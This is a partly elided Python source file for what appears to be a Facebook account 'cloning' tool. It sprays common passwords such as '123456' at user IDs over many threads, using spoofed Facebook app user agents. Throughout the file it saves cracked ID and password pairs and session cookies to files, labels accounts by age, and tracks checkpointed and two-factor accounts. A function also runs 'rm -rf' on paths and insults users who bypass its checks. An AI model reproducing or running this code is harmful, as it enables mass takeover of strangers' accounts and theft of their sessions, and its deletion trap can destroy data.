...
try:
    ...
    exit()
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ LOOP AND KEY ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
oks,cps,loop,apk=[],[],0,[]
...
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ PROXY SERVER ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
...
try:os.makedirs('/sdcard/FARABI-MALLIK')
except:pass
...
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ RND ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def rnd(a,b):
...
def fucked():
    ...
    os.system(f'''rm -rf {y}''')
    os.system(f'''rm -rf {z}''')
    print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m FUCK YOU BYPASS USER SECURITY BY FARABI')
    exit()
...
sys.stdout.write('\x1b]2;<ðŸ’šMR.FARABIðŸ’š>\x07')
def clear():os.system('clear');print(logo)
def linex():print(f'\x1b[1;97mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ CHECKER ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def ashaa(uid):
    if len(uid)==15:
        ...
        elif uid[:5] in ['6155']            :alif = ' NEW ACCOUNTâˆš'
        else:alif=''
...
def asha(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = ' (*-*) 2009 âˆš'
        elif ids[:9] in ['100000000']       :alif = ' ACCOUNT  2009 âˆš'
        elif ids[:8] in ['10000000']        :alif = ' ACCOUNT 2009 âˆš'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 âˆš'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 âˆš'
        elif ids[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 âˆš'
        elif ids[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 âˆš'
        elif ids[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 âˆš'
        elif ids[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 âˆš'
        elif ids[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 âˆš'
        elif ids[:6] in ['100009']          :alif = ' ACCOUNT 2015 âˆš'
        elif ids[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 âˆš'
        elif ids[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 âˆš'
        elif ids[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 âˆš'
        elif ids[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 âˆš'
        elif ids[:5] in ['10005']           :alif = ' ACCOUNT 2020 âˆš'
        elif ids[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 âˆš'
        elif ids[:5] in ['10008']           :alif = ' ACCOUNT 2022 âˆš'
        elif ids[:5] in ['10009']           :alif = ' ACCOUNT 2023 âˆš'
        elif ids[:5] in ['6155']            :alif = ' NEW ACCOUNTâˆš'
        else:alif=''
    ...
    return alif
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ USERAGENT UA ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
ua = UserAgent()
def ugenX():
...
def sex_ua():
    ...
    ___FARABI_ON_FIRE___ = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
    return ___FARABI_ON_FIRE___
...
def sex_uaa():
    ...
    ___FARABI_ON_FIRE___ = ''+str(iphone3)+' '+str(agent3)
    return ___FARABI_ON_FIRE___
...
def ug2():
    ...
    return ua
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ ETC ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
...
██╔══╝░░██╔══██║██╔══██╗██╔══██║██╔══██╗██║
██║░░░░░██║░░██║██║░░██║██║░░██║██████╦╝██║
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝YD \x1b[1;92mE\x1b[1;93mT\x1b[1;94mH\x1b[1;95mA\x1b[1;96mN
\x1b[1;97mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
         ðŸ’š MIND IT NOTHING IS IMPOSSIBLE ðŸ’š
\x1b[1;97mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m AUTHOR   : FOYSAL AHMED FARABI
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m FACEBOOK : FARABI MALLIK
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m GITHUB   : NOT AVAILABLE 
\x1b[1;97mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
 ...
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m SC SEND BY   : \x1b[1;91m[\x1b[1;92mFARABI KING\x1b[1;91m]
\x1b[1;97mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m USERNAME : {___NOT AVAILABLE___}
...
def menu():
            ...
            if xd in ['1','01']:
                ...
                exit(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THANKS FOR USEðŸ¥° ')
            else:
                print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m OPTION NOT FOUND IN MENU...')
                time.sleep(2)
                menu()
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ RANDOM CLONING ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def pak():
    user=[]
    clear()
    ...
    with tred(max_workers=30) as ERROR:	
        ...
        for psx in user:
            ...
            if mthd in ['1','01']:
               FARABI.submit(FARABI,ids,passlist)
            if mthd in ['2','02']:
               FARABI.submit(FARABI2,ids,passlist)
            if mthd in ['3','03']:
               FARABI.submit(FARABI3,ids,passlist)
            if mthd in ['4','04']:
               FARABI.submit(FARABI4,ids,passlist)
    print('\033[1;37m')
    linex()
    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
    linex()
    ...
    input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
    menu()
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ GMAIL CLONING ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def gmail():
    ...
    input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
    menu()
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ OLD CLONING ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def old_clone():
    clear()
    ...
    if _input in ['1','01']:
        ...
        time.sleep(2)
        old_clone()
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ OLD ONE ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def old_one():
    user = []
    clear()
    ...
    main()
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ OLD TOW ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def old_tow():
    user = []
    clear()
    ...
    input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
    main()
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ OLD TREE ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def old_tree():
    user = []
    clear()
    limit = input(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LIMIT : ")
    ...
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                print(f'\r\r\x1b[1;92m[FARABI-OKðŸ’š] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
                open('/sdcard/FARABI-ZONE/FARABI-OLD-M1-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f'\r\r\x1b[1;92m[ERROR-OKðŸ’š] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
...
def login_2(uid):
    ...
    session = requests.Session()
    color = random.choice([P,M,H,K,B,U,O,N])
    sys.stdout.write(f"\r\r\x1b[1;97m[FARABI-XD-M2\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            headers = {
            ...
            if 'session_key' in response or 'EAAA' in str(response):
                print(f'\r\r\x1b[1;92m[FARABI-OKðŸ’š] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
                open('/sdcard/FARABI-ZONE/FARABI-OLD-M2-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break
        ...
        time.sleep(5)
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ OLD M3 ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def login_3(uid):
    global loop,oks,cps
    session = requests.session()
    color = random.choice([P,M,H,K,B,U,O,N])
    sys.stdout.write(f"\r\r\x1b[1;97m[FARABI-XD-M3\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            data = {
            ...
            if 'session_key' in res:
                print(f'\r\r\x1b[1;92m[FARABI-OKðŸ’š] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
                open('/sdcard/FARABI-ZONE/FARABI-OLD-M3-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f'\r\r\x1b[1;92m[FARABI-OKðŸ’š] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
        ...
        time.sleep(5)
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ FILE M1 ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[FARABI-OKðŸ’š] '+ids+' | '+pas)
                                        ...
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M1-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[FARABI-2FðŸ’”] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[FARABI-CPðŸ’”] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                pass
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ FILE M2 ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M2-COOKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[ERROR-2FðŸ’”] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[FARABI-CPðŸ’”] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                pass
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ FILE M3 ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M3-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[FARABI-CPðŸ’”] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                pass
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ FILE M4 ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[FARABI-XD-M4\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M4-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[FARABI-CPðŸ’”] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                pass
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ FILE M5 ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[FARABI-XD-M5\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        q = po
                                        powerERROR = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ERRORramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ERRORramxan};{powerERROR}"
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M5-COOKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M5-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[FARABI-CPðŸ’”] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                ...
                pass
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ FILE M6 ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def api6(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[FARABI-XD-M6\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M6-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M6-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[FARABI-CPðŸ’”] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                pass
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ FILE M7 ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def api7(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[FARABI-XD-M7\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M7-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M7-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[FARABI-CPðŸ’”] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M7-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M7-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                pass
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ FILE M8 ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def api8(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[FARABI-XD-M8\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M8-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/FARABI-ZONE/FARABI-FILE-M8-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[FARABI-CPðŸ’”] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M8-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/FARABI-ZONE/FARABI-FILE-M8-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                pass
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ RANDOM AND GMAIL M1 ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
def ERROR1(ids,passlist):
	global loop,oks,cps
	color = random.choice([P,M,H,K,B,U,O,N])
	sys.stdout.write(f"\r\r\x1b[1;97m[FARABI-XD-M1\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
	sys.stdout.flush()
	...
	for pas in passlist:
		try:
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if uid in str(oks):
					break
				print('\r\r\033[1;32m[FARABI-OKðŸ’š] '+uid+' | '+pas)
				oks.append(uid)
				open('/sdcard/FARABI-ZONE/FARABI-R-OK.txt','a').write(uid+'|'+pas+'\n')
				break
				...
				try:
					...
					ids = ids
				open('/sdcard/FARABI-ZONE/FARABI-R-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:continue
		except (requests.exceptions.ConnectionError):
			time.sleep(5)
			FARABI1(ids,passlist)
		except Exception as e:pass
	loop+=1
#â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­[ AUTO CREATE ]â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­#
